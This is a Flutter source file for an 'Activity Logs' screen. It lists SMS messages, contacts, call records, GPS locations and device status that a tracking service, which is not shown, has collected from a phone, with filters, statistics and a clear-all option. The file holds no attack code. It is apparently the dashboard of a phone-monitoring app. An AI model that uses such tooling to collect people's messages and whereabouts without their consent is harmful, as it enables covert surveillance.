import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import '../services/tracking_service.dart';

class LogsScreen extends StatefulWidget {
  const LogsScreen({super.key});

  @override
  State<LogsScreen> createState() => _LogsScreenState();
}

class _LogsScreenState extends State<LogsScreen> with TickerProviderStateMixin {
  List<Map<String, dynamic>> _logs = [];
  bool _isLoading = true;
  String _selectedFilter = 'All';
  Map<String, dynamic> _stats = {};
  late TabController _tabController;

  final List<String> _filters = [
    'All', 'Location', 'SMS', 'Contacts', 'Call Log', 'Device', 'Network', 'Events'
  ];

  final List<Tab> _tabs = [
    const Tab(text: 'All Logs', icon: Icon(Icons.list)),
    const Tab(text: 'SMS', icon: Icon(Icons.message)),
    const Tab(text: 'Contacts', icon: Icon(Icons.contacts)),
    const Tab(text: 'Calls', icon: Icon(Icons.call)),
    const Tab(text: 'Location', icon: Icon(Icons.location_on)),
    const Tab(text: 'Stats', icon: Icon(Icons.analytics)),
  ];

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: _tabs.length, vsync: this);
    _loadData();
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  Future<void> _loadData() async {
    setState(() {
      _isLoading = true;
    });

    try {
      final logs = await TrackingService.getCollectedData();
      final stats = await TrackingService.getCollectionStats();

      setState(() {
        _logs = logs;
        _stats = stats;
      });
    } catch (e) {
      _showErrorSnackBar('Failed to load data: $e');
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  List<Map<String, dynamic>> get _filteredLogs {
    if (_selectedFilter == 'All') {
      return _logs;
    }

    return _logs.where((log) {
      final sourceFile = log['source_file'] as String? ?? '';
      final event = log['event'] as String? ?? '';

      switch (_selectedFilter) {
        case 'Location':
          return sourceFile.contains('location');
        case 'SMS':
          return sourceFile.contains('sms') || event.contains('SMS');
        case 'Contacts':
          return sourceFile.contains('contacts') || event.contains('CONTACT');
        case 'Call Log':
          return sourceFile.contains('call') || event.contains('CALL');
        case 'Device':
          return sourceFile.contains('device') || sourceFile.contains('system');
        case 'Network':
          return sourceFile.contains('network');
        case 'Events':
          return sourceFile.contains('event') || event.isNotEmpty;
        default:
          return true;
      }
    }).toList();
  }

  void _showErrorSnackBar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: Colors.red,
      ),
    );
  }

  void _showSuccessSnackBar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: Colors.green,
      ),
    );
  }

  void _showLogDetails(Map<String, dynamic> log) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text(_getLogTitle(log)),
        content: SizedBox(
          width: double.maxFinite,
          height: 400,
          child: SingleChildScrollView(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                ...log.entries.map((entry) => Padding(
                  padding: const EdgeInsets.symmetric(vertical: 4),
                  child: Row(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      SizedBox(
                        width: 120,
                        child: Text(
                          '${entry.key}:',
                          style: const TextStyle(
                            fontWeight: FontWeight.bold,
                            color: Colors.blue,
                          ),
                        ),
                      ),
                      Expanded(
                        child: SelectableText(
                          entry.value.toString(),
                          style: const TextStyle(
                            fontFamily: 'monospace',
                            fontSize: 12,
                          ),
                        ),
                      ),
                    ],
                  ),
                )),
              ],
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: const Text('Close'),
          ),
          ElevatedButton.icon(
            onPressed: () {
              _copyToClipboard(log.toString());
              Navigator.of(context).pop();
            },
            icon: const Icon(Icons.copy),
            label: const Text('Copy'),
          ),
        ],
      ),
    );
  }

  void _copyToClipboard(String text) {
    Clipboard.setData(ClipboardData(text: text));
    _showSuccessSnackBar('Copied to clipboard');
  }

  void _exportLogs() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Export Logs'),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('Total logs: ${_logs.length}'),
            Text('SMS messages: ${_stats['sms_count'] ?? 0}'),
            Text('Location records: ${_stats['location_count'] ?? 0}'),
            Text('Call records: ${_stats['call_log_count'] ?? 0}'),
            const SizedBox(height: 16),
            const Text('Export functionality will save all collected data to a file.'),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: const Text('Cancel'),
          ),
          ElevatedButton(
            onPressed: () {
              Navigator.of(context).pop();
              _performExport();
            },
            child: const Text('Export'),
          ),
        ],
      ),
    );
  }

  void _performExport() {
    // TODO: 실제 내보내기 구현
    _showSuccessSnackBar('Export completed (simulated)');
  }

  void _clearLogs() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Clear All Logs'),
        content: const Text(
          'Are you sure you want to clear all collected data? This action cannot be undone.\n\n'
              'This will delete all SMS, contacts, call logs, location data, and other monitoring information.',
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: const Text('Cancel'),
          ),
          ElevatedButton(
            onPressed: () async {
              Navigator.of(context).pop();
              await TrackingService.clearAllData();
              await _loadData();
              _showSuccessSnackBar('All logs cleared');
            },
            style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
            child: const Text('Clear All'),
          ),
        ],
      ),
    );
  }

  IconData _getLogIcon(Map<String, dynamic> log) {
    final sourceFile = log['source_file'] as String? ?? '';
    final event = log['event'] as String? ?? '';

    if (sourceFile.contains('sms') || event.contains('SMS')) {
      return Icons.message;
    } else if (sourceFile.contains('location')) {
      return Icons.location_on;
    } else if (sourceFile.contains('contacts')) {
      return Icons.contacts;
    } else if (sourceFile.contains('call')) {
      return Icons.call;
    } else if (sourceFile.contains('device') || sourceFile.contains('system')) {
      return Icons.phone_android;
    } else if (sourceFile.contains('network')) {
      return Icons.network_check;
    } else if (sourceFile.contains('event') || event.isNotEmpty) {
      return Icons.event;
    } else {
      return Icons.info;
    }
  }

  Color _getLogColor(Map<String, dynamic> log) {
    final sourceFile = log['source_file'] as String? ?? '';
    final event = log['event'] as String? ?? '';

    if (sourceFile.contains('sms') || event.contains('SMS')) {
      return Colors.green;
    } else if (sourceFile.contains('location')) {
      return Colors.blue;
    } else if (sourceFile.contains('contacts')) {
      return Colors.orange;
    } else if (sourceFile.contains('call')) {
      return Colors.purple;
    } else if (sourceFile.contains('device')) {
      return Colors.teal;
    } else if (sourceFile.contains('network')) {
      return Colors.indigo;
    } else if (event.contains('STARTED')) {
      return Colors.green;
    } else if (event.contains('STOPPED')) {
      return Colors.red;
    } else if (event.contains('ERROR')) {
      return Colors.red;
    } else {
      return Colors.grey;
    }
  }

  String _getLogTitle(Map<String, dynamic> log) {
    final sourceFile = log['source_file'] as String? ?? '';
    final event = log['event'] as String? ?? '';
    final address = log['address'] as String?;
    final sender = log['sender'] as String?;
    final phoneNumber = log['phoneNumber'] as String?;
    final contactName = log['contactName'] as String?;

    if (event.isNotEmpty) {
      return event.replaceAll('_', ' ').toLowerCase().split(' ').map((word) =>
      word.isNotEmpty ? word[0].toUpperCase() + word.substring(1) : ''
      ).join(' ');
    }

    if (sourceFile.contains('sms')) {
      return 'SMS from ${address ?? sender ?? "Unknown"}';
    } else if (sourceFile.contains('call')) {
      return 'Call ${contactName ?? phoneNumber ?? "Unknown"}';
    } else if (sourceFile.contains('location')) {
      return 'Location Update';
    } else if (sourceFile.contains('contacts')) {
      return 'Contact Entry';
    } else if (sourceFile.contains('device')) {
      return 'Device Status';
    } else if (sourceFile.contains('network')) {
      return 'Network Info';
    } else {
      return 'System Log';
    }
  }

  String _getLogSubtitle(Map<String, dynamic> log) {
    final details = log['details'] as String?;
    final body = log['body'] as String?;
    final message = log['message'] as String?;
    final name = log['name'] as String?;
    final callType = log['callType'] as String?;
    final duration = log['duration'];

    if (details != null && details.isNotEmpty) {
      return details;
    }

    if (body != null || message != null) {
      final text = body ?? message!;
      return text.length > 50 ? '${text.substring(0, 50)}...' : text;
    }

    if (name != null) {
      return 'Contact: $name';
    }

    if (callType != null) {
      final durationText = duration != null ? ' (${duration}s)' : '';
      return '$callType call$durationText';
    }

    final latitude = log['latitude'];
    final longitude = log['longitude'];
    if (latitude != null && longitude != null) {
      return 'Lat: ${latitude.toStringAsFixed(4)}, Lng: ${longitude.toStringAsFixed(4)}';
    }

    final networkType = log['network_type'];
    if (networkType != null) {
      return 'Network: $networkType';
    }

    final batteryLevel = log['battery_level'];
    if (batteryLevel != null) {
      return 'Battery: $batteryLevel%';
    }

    return 'Tap to view details';
  }

  String _formatTimestamp(String? timestamp) {
    if (timestamp == null) return 'Unknown time';

    try {
      final dateTime = DateTime.parse(timestamp);
      final now = DateTime.now();
      final difference = now.difference(dateTime);

      if (difference.inMinutes < 1) {
        return 'Just now';
      } else if (difference.inHours < 1) {
        return '${difference.inMinutes}m ago';
      } else if (difference.inDays < 1) {
        return '${difference.inHours}h ago';
      } else {
        return '${difference.inDays}d ago';
      }
    } catch (e) {
      return 'Invalid time';
    }
  }

  Widget _buildStatsTab() {
    return RefreshIndicator(
      onRefresh: _loadData,
      child: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Card(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Collection Statistics',
                      style: Theme.of(context).textTheme.titleLarge?.copyWith(
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    const SizedBox(height: 16),
                    _buildStatRow('Total Log Files', _stats['total_log_files']?.toString() ?? '0'),
                    _buildStatRow('Data Files', _stats['total_data_files']?.toString() ?? '0'),
                    _buildStatRow('SMS Messages', _stats['sms_count']?.toString() ?? '0'),
                    _buildStatRow('Location Records', _stats['location_count']?.toString() ?? '0'),
                    _buildStatRow('Call Records', _stats['call_log_count']?.toString() ?? '0'),
                    _buildStatRow('Event Logs', _stats['event_count']?.toString() ?? '0'),
                    const Divider(),
                    _buildStatRow('Last Update', _formatTimestamp(_stats['last_update'])),
                  ],
                ),
              ),
            ),

            const SizedBox(height: 16),

            Card(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Collection Intervals',
                      style: Theme.of(context).textTheme.titleMedium?.copyWith(
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    const SizedBox(height: 12),
                    ...TrackingService.collectionIntervals.entries.map((entry) =>
                        _buildStatRow(
                          entry.key.toUpperCase(),
                          '${entry.value} minutes',
                        )
                    ),
                  ],
                ),
              ),
            ),

            const SizedBox(height: 16),

            Card(
              child: Padding(
                padding: const EdgeInsets.all(16),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Service Status',
                      style: Theme.of(context).textTheme.titleMedium?.copyWith(
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    const SizedBox(height: 12),
                    _buildStatRow(
                      'Tracking Active',
                      TrackingService.isTracking ? 'Yes' : 'No',
                      color: TrackingService.isTracking ? Colors.green : Colors.red,
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStatRow(String label, String value, {Color? color}) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(
            label,
            style: const TextStyle(fontWeight: FontWeight.w500),
          ),
          Text(
            value,
            style: TextStyle(
              fontWeight: FontWeight.bold,
              color: color ?? Theme.of(context).primaryColor,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildLogsList(Future<List<Map<String, dynamic>>> Function() dataLoader) {
    return FutureBuilder<List<Map<String, dynamic>>>(
      future: dataLoader(),
      builder: (context, snapshot) {
        if (snapshot.connectionState == ConnectionState.waiting) {
          return const Center(child: CircularProgressIndicator());
        }

        if (snapshot.hasError) {
          return Center(
            child: Text('Error: ${snapshot.error}'),
          );
        }

        final data = snapshot.data ?? [];

        if (data.isEmpty) {
          return const Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.inbox_outlined, size: 64, color: Colors.grey),
                SizedBox(height: 16),
                Text('No data available'),
              ],
            ),
          );
        }

        return RefreshIndicator(
          onRefresh: _loadData,
          child: ListView.builder(
            padding: const EdgeInsets.all(16),
            itemCount: data.length,
            itemBuilder: (context, index) {
              final log = data[index];
              return Card(
                margin: const EdgeInsets.only(bottom: 8),
                child: ListTile(
                  leading: CircleAvatar(
                    backgroundColor: _getLogColor(log).withOpacity(0.1),
                    child: Icon(
                      _getLogIcon(log),
                      color: _getLogColor(log),
                      size: 20,
                    ),
                  ),
                  title: Text(
                    _getLogTitle(log),
                    style: const TextStyle(fontWeight: FontWeight.w500),
                  ),
                  subtitle: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(_getLogSubtitle(log)),
                      const SizedBox(height: 4),
                      Text(
                        _formatTimestamp(log['timestamp']),
                        style: TextStyle(
                          fontSize: 12,
                          color: Colors.grey[600],
                        ),
                      ),
                    ],
                  ),
                  trailing: const Icon(Icons.arrow_forward_ios, size: 16),
                  onTap: () => _showLogDetails(log),
                ),
              );
            },
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Activity Logs'),
        elevation: 2,
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh),
            onPressed: _loadData,
            tooltip: 'Refresh',
          ),
          PopupMenuButton<String>(
            icon: const Icon(Icons.more_vert),
            onSelected: (value) {
              switch (value) {
                case 'export':
                  _exportLogs();
                  break;
                case 'clear':
                  _clearLogs();
                  break;
              }
            },
            itemBuilder: (context) => [
              const PopupMenuItem(
                value: 'export',
                child: Row(
                  children: [
                    Icon(Icons.file_download),
                    SizedBox(width: 8),
                    Text('Export Logs'),
                  ],
                ),
              ),
              const PopupMenuItem(
                value: 'clear',
                child: Row(
                  children: [
                    Icon(Icons.clear_all, color: Colors.red),
                    SizedBox(width: 8),
                    Text('Clear All Logs', style: TextStyle(color: Colors.red)),
                  ],
                ),
              ),
            ],
          ),
        ],
        bottom: TabBar(
          controller: _tabController,
          isScrollable: true,
          tabs: _tabs,
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          // All Logs
          _isLoading
              ? const Center(child: CircularProgressIndicator())
              : _filteredLogs.isEmpty
              ? const Center(
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.inbox_outlined, size: 64, color: Colors.grey),
                SizedBox(height: 16),
                Text('No logs available'),
                SizedBox(height: 8),
                Text('Start monitoring to see activity logs here'),
              ],
            ),
          )
              : RefreshIndicator(
            onRefresh: _loadData,
            child: Column(
              children: [
                // Filter chips
                Container(
                  padding: const EdgeInsets.all(16),
                  child: SingleChildScrollView(
                    scrollDirection: Axis.horizontal,
                    child: Row(
                      children: _filters.map((filter) => Padding(
                        padding: const EdgeInsets.only(right: 8),
                        child: FilterChip(
                          label: Text(filter),
                          selected: _selectedFilter == filter,
                          onSelected: (selected) {
                            setState(() {
                              _selectedFilter = filter;
                            });
                          },
                        ),
                      )).toList(),
                    ),
                  ),
                ),
                // Logs list
                Expanded(
                  child: ListView.builder(
                    padding: const EdgeInsets.symmetric(horizontal: 16),
                    itemCount: _filteredLogs.length,
                    itemBuilder: (context, index) {
                      final log = _filteredLogs[index];
                      return Card(
                        margin: const EdgeInsets.only(bottom: 8),
                        child: ListTile(
                          leading: CircleAvatar(
                            backgroundColor: _getLogColor(log).withOpacity(0.1),
                            child: Icon(
                              _getLogIcon(log),
                              color: _getLogColor(log),
                              size: 20,
                            ),
                          ),
                          title: Text(
                            _getLogTitle(log),
                            style: const TextStyle(fontWeight: FontWeight.w500),
                          ),
                          subtitle: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(_getLogSubtitle(log)),
                              const SizedBox(height: 4),
                              Text(
                                _formatTimestamp(log['timestamp']),
                                style: TextStyle(
                                  fontSize: 12,
                                  color: Colors.grey[600],
                                ),
                              ),
                            ],
                          ),
                          trailing: const Icon(Icons.arrow_forward_ios, size: 16),
                          onTap: () => _showLogDetails(log),
                        ),
                      );
                    },
                  ),
                ),
              ],
            ),
          ),

          // SMS Tab
          _buildLogsList(() => TrackingService.getSMSData()),

          // Contacts Tab
          _buildLogsList(() => TrackingService.getContactsData()),

          // Calls Tab
          _buildLogsList(() => TrackingService.getCallLogData()),

          // Location Tab
          _buildLogsList(() => TrackingService.getLocationData()),

          // Stats Tab
          _buildStatsTab(),
        ],
      ),
    );
  }
}